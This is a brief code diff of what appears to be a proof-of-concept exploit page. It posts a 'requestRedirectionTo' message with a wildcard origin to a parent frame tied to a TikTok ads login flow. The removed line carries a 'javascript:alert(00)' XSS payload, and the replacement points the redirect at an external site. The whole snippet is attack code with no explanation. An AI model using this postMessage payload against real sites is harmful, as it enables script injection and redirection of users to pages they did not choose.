@@ -2,10 +2,11 @@
   const clientKey = "aw8cb3204x0a1g88";
   const redirectUri = encodeURIComponent("https://ads.tiktok.com/i18n/login/");
 
-  const url = `javascript:alert(00)`;
+  const url = `https://imran.com`;
 
   parent.postMessage({
     action: "requestRedirectionTo",
+    type: "MAPI",
     targetUrlStr: url
   }, "*");
 </script>
